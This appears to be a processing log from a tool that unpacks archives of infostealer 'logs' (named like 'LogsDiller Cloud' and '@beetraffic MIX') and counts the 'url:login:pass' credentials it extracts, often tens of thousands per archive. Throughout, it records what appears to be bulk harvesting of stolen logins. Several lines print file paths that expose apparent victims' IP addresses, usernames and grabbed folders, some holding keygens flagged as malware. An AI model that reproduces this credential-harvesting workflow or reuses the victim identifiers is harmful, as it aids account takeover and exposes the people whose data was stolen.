+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1411_#100.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1433_#246.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1442_#254.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1468_#114.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1516_#46.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1520_#99.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1564_#147.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1606_#251.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1612_#107.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1613_#110.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1666_#28.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1722_#106.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1778_#95.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1781_#116.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1792_#104.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1858_#113.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1878_#109.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1909_#115.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_2070_#111.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_2111_#105.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_2511_#98.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_2519_#101.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_2523_#118.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_2773_#96.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_3277_#253.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_Free_240_#195.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_Free_372_#194.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_Free_500_#196.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] Password pre-check done: 111/111 openable.
+[2026-06-21 04:01:59] SCAN @beetraffic 1603 MIX 07-04-2026.zip | solid=False type=Zip entries=13490 pwFiles=580 combos=19733 fails=0 time=00:00:00
+[2026-06-21 04:01:59] @beetraffic 1603 MIX 07-04-2026.zip -> COMPLETED SUCCESSFULLY (14.517 url:login:pass found, 580 files) [password: settings password] [00:00:00]
+[2026-06-21 04:02:01] OPEN FAILED Keygen-CORE.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_3bf5ee47c6b440a3a899df48b3a8de69\MM_103.83.189.10_11-04-26\Files\Desktop\freee4pc.org_UltraISO Premium Edition _ 9.7.6.3829\freee4pc.org_UltraISO Premium Edition Crack 9.7.6.3829\Keygen-CORE.rar'
+[2026-06-21 04:02:01] OPEN FAILED VG Tool 4.1_KeyGEN.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_3bf5ee47c6b440a3a899df48b3a8de69\MW_102.70.119.90_08-04-26\Files\Desktop\Adplus 002\Downloads\VG Tool 4.1_KeyGEN.rar'
+[2026-06-21 04:02:02] SCAN @beetraffic 1609 MIX 14-04-2026.zip | solid=False type=Zip entries=49681 pwFiles=1452 combos=134601 fails=0 time=00:00:02
+[2026-06-21 04:02:02] @beetraffic 1609 MIX 14-04-2026.zip -> COMPLETED SUCCESSFULLY (84.670 url:login:pass found, 1452 files) [password: settings password] [00:00:02]
+[2026-06-21 04:02:05] SCAN @beetraffic 3000 MIX 17-06-2026.zip | solid=False type=Zip entries=69881 pwFiles=2315 combos=131759 fails=0 time=00:00:03
+[2026-06-21 04:02:05] @beetraffic 3000 MIX 17-06-2026.zip -> COMPLETED SUCCESSFULLY (90.552 url:login:pass found, 2315 files) [password: settings password] [00:00:03]
+[2026-06-21 04:02:09] SCAN @beetraffic 3000 MIX 20-06-2026.zip | solid=False type=Zip entries=71327 pwFiles=2339 combos=145885 fails=0 time=00:00:03
+[2026-06-21 04:02:09] @beetraffic 3000 MIX 20-06-2026.zip -> COMPLETED SUCCESSFULLY (86.436 url:login:pass found, 2339 files) [password: settings password] [00:00:03]
+[2026-06-21 04:02:15] OPEN FAILED RKT_rockusb-v3.00_2013_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-21 04:02:17] OPEN FAILED RKT_rockusb-v3.00_2013_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-21 04:02:18] OPEN FAILED RKT_rockusb-v3.00_2013_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-21 04:02:19] SCAN @beetraffic 4000 MIX 15-06-2026.zip | solid=False type=Zip entries=91841 pwFiles=3220 combos=195514 fails=0 time=00:00:09
+[2026-06-21 04:02:19] @beetraffic 4000 MIX 15-06-2026.zip -> COMPLETED SUCCESSFULLY (73.651 url:login:pass found, 3220 files) [password: settings password] [00:00:09]
+[2026-06-21 04:02:23] OPEN FAILED VG Tool 4.1_KeyGEN.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_aee584ff85a344a6b836cd96d3079993\MA_160.178.84.35_26-05-26\Files\Desktop\soft\GoogleChacha VG  TOOL 4.1\VG Tool 4.1_KeyGEN.rar'
+[2026-06-21 04:02:24] SCAN @beetraffic 4500 MIX 02-06-2026.zip | solid=False type=Zip entries=101839 pwFiles=3680 combos=199740 fails=0 time=00:00:05
+[2026-06-21 04:02:24] @beetraffic 4500 MIX 02-06-2026.zip -> COMPLETED SUCCESSFULLY (110.580 url:login:pass found, 3680 files) [password: settings password] [00:00:05]
+[2026-06-21 04:02:25] OPEN FAILED Keygen.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:02:31] OPEN FAILED RKT_rockusb-v3.00_2013_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-21 04:02:33] OPEN FAILED RKT_rockusb-v3.00_2013_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-21 04:02:33] OPEN FAILED Keygen-FALLEN.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_78a5ea02875d4b95889196feb3aed76c\ZA_165.73.162.88_04-06-26\Files\Desktop\Desktop\free4pc.org_AOMEI Partition Assistant Crack 9.6 With License Key Download [Latest]\Keygen-FALLEN.rar'
+[2026-06-21 04:02:34] SCAN @beetraffic 5000 MIX 08-06-2026.zip | solid=False type=Zip entries=109973 pwFiles=4081 combos=230609 fails=0 time=00:00:09
+[2026-06-21 04:02:34] @beetraffic 5000 MIX 08-06-2026.zip -> COMPLETED SUCCESSFULLY (104.290 url:login:pass found, 4081 files) [password: settings password] [00:00:09]
+[2026-06-21 04:02:41] OPEN FAILED RKT_rockusb-v3.00_2013_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-21 04:02:42] OPEN FAILED RKT_rockusb-v3.00_2013_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-21 04:02:42] OPEN FAILED MOBILedit_Forensicpass 789789.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:02:43] SCAN @beetraffic 5555 MIX 11-06-2026.zip | solid=False type=Zip entries=117452 pwFiles=4562 combos=224637 fails=0 time=00:00:08
+[2026-06-21 04:02:43] @beetraffic 5555 MIX 11-06-2026.zip -> COMPLETED SUCCESSFULLY (39.888 url:login:pass found, 4562 files) [password: settings password] [00:00:08]
+[2026-06-21 04:02:50] SCAN @beetraffic 6000 04-06-2026.zip | solid=False type=Zip entries=134510 pwFiles=5214 combos=286653 fails=0 time=00:00:07
+[2026-06-21 04:02:50] @beetraffic 6000 04-06-2026.zip -> COMPLETED SUCCESSFULLY (95.370 url:login:pass found, 5214 files) [password: settings password] [00:00:07]
+[2026-06-21 04:02:52] SCAN @beetraffic_cloud 1420 MIX 07-05-2026.zip | solid=False type=Zip entries=43193 pwFiles=990 combos=85457 fails=0 time=00:00:01
+[2026-06-21 04:02:52] @beetraffic_cloud 1420 MIX 07-05-2026.zip -> COMPLETED SUCCESSFULLY (57.402 url:login:pass found, 990 files) [password: settings password] [00:00:01]
+[2026-06-21 04:02:54] OPEN FAILED VG Tool 4.1_KeyGEN.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_d42c44b02e4646cdb76223f354592628\MA_41.249.199.206_08-05-26\Files\Desktop\soft\GoogleChacha VG  TOOL 4.1\VG Tool 4.1_KeyGEN.rar'
+[2026-06-21 04:02:54] SCAN @beetraffic_cloud 1500 MIX 12-05-2026.zip | solid=False type=Zip entries=37425 pwFiles=1027 combos=76045 fails=0 time=00:00:02
+[2026-06-21 04:02:54] @beetraffic_cloud 1500 MIX 12-05-2026.zip -> COMPLETED SUCCESSFULLY (46.938 url:login:pass found, 1027 files) [password: settings password] [00:00:02]
+[2026-06-21 04:02:59] OPEN FAILED MTK_FP_v1.1123.0_2014_pass_1111.7z -> DataErrorException: Data Error
+[2026-06-21 04:02:59] SCAN @beetraffic_cloud 1808 MIX 01-05-2026.zip | solid=False type=Zip entries=49168 pwFiles=1442 combos=127129 fails=0 time=00:00:04
+[2026-06-21 04:02:59] @beetraffic_cloud 1808 MIX 01-05-2026.zip -> COMPLETED SUCCESSFULLY (90.172 url:login:pass found, 1442 files) [password: settings password] [00:00:04]
+[2026-06-21 04:03:02] OPEN FAILED VG Tool 4.1_KeyGEN.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_7fc08916bba74f0c870e7745f064b4a6\MA_81.192.142.210_21-04-26\Files\Desktop\repaire soft\GoogleChacha VG  TOOL 4.1\VG Tool 4.1_KeyGEN.rar'
+[2026-06-21 04:03:03] SCAN @beetraffic_cloud 1972 MIX 28-04-2026.zip | solid=False type=Zip entries=58831 pwFiles=1847 combos=158566 fails=0 time=00:00:04
+[2026-06-21 04:03:03] @beetraffic_cloud 1972 MIX 28-04-2026.zip -> COMPLETED SUCCESSFULLY (95.601 url:login:pass found, 1847 files) [password: settings password] [00:00:04]
+[2026-06-21 04:03:06] OPEN FAILED iBypassSignal3.2.zip -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:03:06] OPEN FAILED VG Tool 4.1_KeyGEN (1).rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_1225b755c58a4f01a813bf27c37ebfd8\PK_182.188.115.41_18-04-26\Files\Desktop\New folder (3)\VG Tool 4.1_KeyGEN (1).rar'
+[2026-06-21 04:03:06] OPEN FAILED VG Tool 4.1_KeyGEN (1).rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_1225b755c58a4f01a813bf27c37ebfd8\PK_39.63.29.185_16-04-26\Files\Desktop\New folder (3)\VG Tool 4.1_KeyGEN (1).rar'
+[2026-06-21 04:03:06] OPEN FAILED fastboot_lamu_g_user_15_VVTAS35.51_137_2_1_c99c2a_release_keys.zip -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:03:07] SCAN @beetraffic_cloud 4141 MIX 21-04-2026.zip | solid=False type=Zip entries=70110 pwFiles=2925 combos=189399 fails=0 time=00:00:03
+[2026-06-21 04:03:07] @beetraffic_cloud 4141 MIX 21-04-2026.zip -> COMPLETED SUCCESSFULLY (117.654 url:login:pass found, 2925 files) [password: settings password] [00:00:03]
+[2026-06-21 04:03:09] OPEN FAILED RKT_rockusb-v3.00_pass-1111 (1).7z -> DataErrorException: Data Error
+[2026-06-21 04:03:11] OPEN FAILED RKT_rockusb-v3.00_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-21 04:03:16] SCAN ⚡️Luffich&Cloud FREE LOGS⚡️ (2).rar | solid=False type=Rar entries=14319 pwFiles=477 combos=23820 fails=1 time=00:00:08
+[2026-06-21 04:03:16] ⚡️Luffich&Cloud FREE LOGS⚡️ (2).rar -> COMPLETED SUCCESSFULLY (9.628 url:login:pass found, 477 files) [password: settings password] [00:00:08]
+[2026-06-21 04:03:21] SCAN ⚡️Luffich&Cloud FREE LOGS⚡️ (3).rar | solid=False type=Rar entries=11501 pwFiles=497 combos=20690 fails=1 time=00:00:05
+[2026-06-21 04:03:21] ⚡️Luffich&Cloud FREE LOGS⚡️ (3).rar -> COMPLETED SUCCESSFULLY (2.791 url:login:pass found, 497 files) [password: settings password] [00:00:05]
+[2026-06-21 04:03:31] SCAN ⚡️Luffich&Cloud FREE LOGS⚡️ (4).rar | solid=False type=Rar entries=27584 pwFiles=776 combos=64056 fails=5 time=00:00:09
+[2026-06-21 04:03:31] ⚡️Luffich&Cloud FREE LOGS⚡️ (4).rar -> COMPLETED SUCCESSFULLY (45.834 url:login:pass found, 776 files) [password: settings password] [00:00:09]
+[2026-06-21 04:03:40] SCAN ⚡️Luffich&Cloud FREE LOGS⚡️.rar | solid=False type=Rar entries=21158 pwFiles=645 combos=36768 fails=0 time=00:00:08
+[2026-06-21 04:03:40] ⚡️Luffich&Cloud FREE LOGS⚡️.rar -> COMPLETED SUCCESSFULLY (26.757 url:login:pass found, 645 files) [password: settings password] [00:00:08]
+[2026-06-21 04:03:40] ⚡️Luffich&Cloud FREE TXT⚡️ (2).rar -> COMPLETED SUCCESSFULLY (0 url:login:pass found, 0 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:40] ⚡️Luffich&Cloud FREE TXT⚡️ (3).rar -> COMPLETED SUCCESSFULLY (0 url:login:pass found, 0 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:40] ⚡️Luffich&Cloud FREE TXT⚡️.rar -> COMPLETED SUCCESSFULLY (0 url:login:pass found, 0 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:40] SCAN LogsDiller Cloud_ 224_#64.zip | solid=False type=Zip entries=4979 pwFiles=89 combos=4907 fails=0 time=00:00:00
+[2026-06-21 04:03:40] LogsDiller Cloud_ 224_#64.zip -> COMPLETED SUCCESSFULLY (3.930 url:login:pass found, 89 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:40] OPEN FAILED iggtech.com.xforce.2020v2.keygen.Autodesk.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_cb3c4825776b4a18a63bac8ab7f90869\BR[A7638B6169B0E9FA29B4AE201CF32E6F] [2022-04-08T08_32_29.09\FileGrabber\Users\Thayrine\Documents\iggtech.com.xforce.2020v2.keygen.Autodesk.rar'
+[2026-06-21 04:03:40] OPEN FAILED SignCut-Pro-1.95Stable-crack-activation-keygen.rar-Full.zip -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:03:40] SCAN LogsDiller Cloud_ 473_#63.zip | solid=False type=Zip entries=9965 pwFiles=183 combos=11900 fails=0 time=00:00:00
+[2026-06-21 04:03:40] LogsDiller Cloud_ 473_#63.zip -> COMPLETED SUCCESSFULLY (9.884 url:login:pass found, 183 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:40] SCAN LogsDiller Cloud_211_#26.zip | solid=False type=Zip entries=4409 pwFiles=66 combos=3150 fails=0 time=00:00:00
+[2026-06-21 04:03:40] LogsDiller Cloud_211_#26.zip -> COMPLETED SUCCESSFULLY (2.814 url:login:pass found, 66 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:40] SCAN LogsDiller Cloud_308_#54.zip | solid=False type=Zip entries=10288 pwFiles=124 combos=6309 fails=0 time=00:00:00
+[2026-06-21 04:03:40] LogsDiller Cloud_308_#54.zip -> COMPLETED SUCCESSFULLY (5.165 url:login:pass found, 124 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:41] SCAN LogsDiller Cloud_339_#137.zip | solid=False type=Zip entries=6793 pwFiles=184 combos=11920 fails=0 time=00:00:00
+[2026-06-21 04:03:41] LogsDiller Cloud_339_#137.zip -> COMPLETED SUCCESSFULLY (9.868 url:login:pass found, 184 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:41] SCAN LogsDiller Cloud_341_#36.zip | solid=False type=Zip entries=6037 pwFiles=144 combos=7084 fails=0 time=00:00:00
+[2026-06-21 04:03:41] LogsDiller Cloud_341_#36.zip -> COMPLETED SUCCESSFULLY (6.133 url:login:pass found, 144 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:41] SCAN LogsDiller Cloud_401_#47.zip | solid=False type=Zip entries=7669 pwFiles=180 combos=11162 fails=0 time=00:00:00
+[2026-06-21 04:03:41] LogsDiller Cloud_401_#47.zip -> COMPLETED SUCCESSFULLY (9.400 url:login:pass found, 180 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:41] SCAN LogsDiller Cloud_420_#143.zip | solid=False type=Zip entries=8836 pwFiles=243 combos=16058 fails=0 time=00:00:00
+[2026-06-21 04:03:41] LogsDiller Cloud_420_#143.zip -> COMPLETED SUCCESSFULLY (12.795 url:login:pass found, 243 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:42] SCAN LogsDiller Cloud_421_#144.zip | solid=False type=Zip entries=8799 pwFiles=265 combos=13541 fails=0 time=00:00:00
+[2026-06-21 04:03:42] LogsDiller Cloud_421_#144.zip -> COMPLETED SUCCESSFULLY (11.532 url:login:pass found, 265 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:42] SCAN LogsDiller Cloud_433_#150.zip | solid=False type=Zip entries=6917 pwFiles=122 combos=8940 fails=0 time=00:00:00
+[2026-06-21 04:03:42] LogsDiller Cloud_433_#150.zip -> COMPLETED SUCCESSFULLY (8.365 url:login:pass found, 122 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:42] SCAN LogsDiller Cloud_441_#149.zip | solid=False type=Zip entries=8571 pwFiles=155 combos=7989 fails=0 time=00:00:00
+[2026-06-21 04:03:42] LogsDiller Cloud_441_#149.zip -> COMPLETED SUCCESSFULLY (6.825 url:login:pass found, 155 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:42] OPEN FAILED Keygen.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_acc532766f304da68a3d32d5abba2759\AR[D38CEA21191629A49A670911E43B021F] [2022-04-06T09_29_50.59\FileGrabber\Users\USUARIO\Documents\Keygen.rar'
+[2026-06-21 04:03:42] SCAN LogsDiller Cloud_451_#59.zip | solid=False type=Zip entries=10305 pwFiles=175 combos=8342 fails=0 time=00:00:00
+[2026-06-21 04:03:42] LogsDiller Cloud_451_#59.zip -> COMPLETED SUCCESSFULLY (7.309 url:login:pass found, 175 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:43] SCAN LogsDiller Cloud_493_#61.zip | solid=False type=Zip entries=9961 pwFiles=178 combos=9738 fails=0 time=00:00:00
+[2026-06-21 04:03:43] LogsDiller Cloud_493_#61.zip -> COMPLETED SUCCESSFULLY (8.872 url:login:pass found, 178 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:43] OPEN FAILED Keygen.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:03:43] SCAN LogsDiller Cloud_493_#119.zip | solid=False type=Zip entries=10518 pwFiles=346 combos=22466 fails=0 time=00:00:00
+[2026-06-21 04:03:43] LogsDiller Cloud_493_#119.zip -> COMPLETED SUCCESSFULLY (19.104 url:login:pass found, 346 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:43] SCAN LogsDiller Cloud_494_#142.zip | solid=False type=Zip entries=9899 pwFiles=267 combos=17153 fails=0 time=00:00:00
+[2026-06-21 04:03:43] LogsDiller Cloud_494_#142.zip -> COMPLETED SUCCESSFULLY (14.420 url:login:pass found, 267 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:43] OPEN FAILED Corel.Products.MultiKeygen-XFORCE.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_f644abf2cfb94cb785362529a86a9ecd\BR[937518E8D5D134BEE60D6666465AA6A3] [2022-03-16T14_18_28.56\FileGrabber\Users\USER\Desktop\Corel.Products.MultiKeygen-XFORCE.rar'
+[2026-06-21 04:03:43] OPEN FAILED icongnghe.com.xforce.2016.keygen.Autodesk.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_f644abf2cfb94cb785362529a86a9ecd\BR[937518E8D5D134BEE60D6666465AA6A3] [2022-03-16T14_18_28.56\FileGrabber\Users\USER\Desktop\icongnghe.com.xforce.2016.keygen.Autodesk.rar'
+[2026-06-21 04:03:44] SCAN LogsDiller Cloud_495_#31.zip | solid=False type=Zip entries=9263 pwFiles=241 combos=14537 fails=0 time=00:00:00
+[2026-06-21 04:03:44] LogsDiller Cloud_495_#31.zip -> COMPLETED SUCCESSFULLY (11.746 url:login:pass found, 241 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:44] SCAN LogsDiller Cloud_502_#79.zip | solid=False type=Zip entries=8665 pwFiles=74 combos=5916 fails=0 time=00:00:00
+[2026-06-21 04:03:44] LogsDiller Cloud_502_#79.zip -> COMPLETED SUCCESSFULLY (5.442 url:login:pass found, 74 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:44] SCAN LogsDiller Cloud_511_#56.zip | solid=False type=Zip entries=10746 pwFiles=188 combos=9473 fails=0 time=00:00:00
+[2026-06-21 04:03:44] LogsDiller Cloud_511_#56.zip -> COMPLETED SUCCESSFULLY (8.187 url:login:pass found, 188 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:44] OPEN FAILED keygen 64bit.zip -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_6b797ee1840346e59f80ad9e79c7c0d1\ID[9340BFDB0142778F2E2291C3BC92F991] [2022-04-16T14_30_19.32\FileGrabber\Users\Windows 10\Documents\keygen 64bit.zip'
+[2026-06-21 04:03:44] SCAN LogsDiller Cloud_513_#73.zip | solid=False type=Zip entries=10961 pwFiles=179 combos=8733 fails=0 time=00:00:00
+[2026-06-21 04:03:44] LogsDiller Cloud_513_#73.zip -> COMPLETED SUCCESSFULLY (6.342 url:login:pass found, 179 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:45] SCAN LogsDiller Cloud_521_#68.zip | solid=False type=Zip entries=10767 pwFiles=205 combos=12817 fails=0 time=00:00:00
+[2026-06-21 04:03:45] LogsDiller Cloud_521_#68.zip -> COMPLETED SUCCESSFULLY (9.310 url:login:pass found, 205 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:45] OPEN FAILED Keygen Corel 2017.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_fe6f868f31a74e0386d1402ee46f8d6c\BR[71593210121FBB7771961A2CBB07C868] [2022-03-18T18_05_47.85\FileGrabber\Users\Amanda\Documents\Keygen Corel 2017.rar'
+[2026-06-21 04:03:45] SCAN LogsDiller Cloud_526_#35.zip | solid=False type=Zip entries=10202 pwFiles=246 combos=19297 fails=0 time=00:00:00
+[2026-06-21 04:03:45] LogsDiller Cloud_526_#35.zip -> COMPLETED SUCCESSFULLY (14.727 url:login:pass found, 246 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:45] SCAN LogsDiller Cloud_527_#140.zip | solid=False type=Zip entries=9903 pwFiles=276 combos=18018 fails=0 time=00:00:00
+[2026-06-21 04:03:45] LogsDiller Cloud_527_#140.zip -> COMPLETED SUCCESSFULLY (13.852 url:login:pass found, 276 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:46] SCAN LogsDiller Cloud_530_#66.zip | solid=False type=Zip entries=11081 pwFiles=229 combos=11134 fails=0 time=00:00:00
+[2026-06-21 04:03:46] LogsDiller Cloud_530_#66.zip -> COMPLETED SUCCESSFULLY (8.903 url:login:pass found, 229 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:46] OPEN FAILED Wondershare-PDF-Password-Remover-V1.5.0-With-Key-[iahq76]-Full-Version.zip -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 04:03:46] SCAN LogsDiller Cloud_535_#151.zip | solid=False type=Zip entries=9908 pwFiles=204 combos=10141 fails=0 time=00:00:00
+[2026-06-21 04:03:46] LogsDiller Cloud_535_#151.zip -> COMPLETED SUCCESSFULLY (8.667 url:login:pass found, 204 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:46] SCAN LogsDiller Cloud_537_#146.zip | solid=False type=Zip entries=9998 pwFiles=293 combos=22772 fails=0 time=00:00:00
+[2026-06-21 04:03:46] LogsDiller Cloud_537_#146.zip -> COMPLETED SUCCESSFULLY (18.688 url:login:pass found, 293 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:47] SCAN LogsDiller Cloud_541_#27.zip | solid=False type=Zip entries=11577 pwFiles=270 combos=17570 fails=0 time=00:00:00
+[2026-06-21 04:03:47] LogsDiller Cloud_541_#27.zip -> COMPLETED SUCCESSFULLY (14.957 url:login:pass found, 270 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:47] SCAN LogsDiller Cloud_545_#42.zip | solid=False type=Zip entries=10147 pwFiles=296 combos=14507 fails=0 time=00:00:00
+[2026-06-21 04:03:47] LogsDiller Cloud_545_#42.zip -> COMPLETED SUCCESSFULLY (12.994 url:login:pass found, 296 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:47] SCAN LogsDiller Cloud_578_#50.zip | solid=False type=Zip entries=10989 pwFiles=245 combos=9804 fails=0 time=00:00:00
+[2026-06-21 04:03:47] LogsDiller Cloud_578_#50.zip -> COMPLETED SUCCESSFULLY (8.801 url:login:pass found, 245 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:48] SCAN LogsDiller Cloud_591_#39.zip | solid=False type=Zip entries=11318 pwFiles=244 combos=13428 fails=0 time=00:00:00
+[2026-06-21 04:03:48] LogsDiller Cloud_591_#39.zip -> COMPLETED SUCCESSFULLY (11.866 url:login:pass found, 244 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:48] SCAN LogsDiller Cloud_612_#60.zip | solid=False type=Zip entries=13428 pwFiles=229 combos=16097 fails=0 time=00:00:00
+[2026-06-21 04:03:48] LogsDiller Cloud_612_#60.zip -> COMPLETED SUCCESSFULLY (14.126 url:login:pass found, 229 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:48] SCAN LogsDiller Cloud_618_#148.zip | solid=False type=Zip entries=11711 pwFiles=311 combos=21840 fails=0 time=00:00:00
+[2026-06-21 04:03:48] LogsDiller Cloud_618_#148.zip -> COMPLETED SUCCESSFULLY (19.034 url:login:pass found, 311 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:49] SCAN LogsDiller Cloud_626_#44.zip | solid=False type=Zip entries=12117 pwFiles=263 combos=15054 fails=0 time=00:00:00
+[2026-06-21 04:03:49] LogsDiller Cloud_626_#44.zip -> COMPLETED SUCCESSFULLY (13.530 url:login:pass found, 263 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:49] SCAN LogsDiller Cloud_645_#256.zip | solid=False type=Zip entries=10932 pwFiles=211 combos=10590 fails=0 time=00:00:00
+[2026-06-21 04:03:49] LogsDiller Cloud_645_#256.zip -> COMPLETED SUCCESSFULLY (8.727 url:login:pass found, 211 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:49] SCAN LogsDiller Cloud_655_#243.zip | solid=False type=Zip entries=10992 pwFiles=319 combos=20176 fails=0 time=00:00:00
+[2026-06-21 04:03:49] LogsDiller Cloud_655_#243.zip -> COMPLETED SUCCESSFULLY (16.394 url:login:pass found, 319 files) [password: no password] [00:00:00]
+[2026-06-21 04:03:50] SCAN LogsDiller Cloud_667_#245.zip | solid=False type=Zip entries=12789 pwFiles=296 combos=14222 fails=0 time=00:00:00
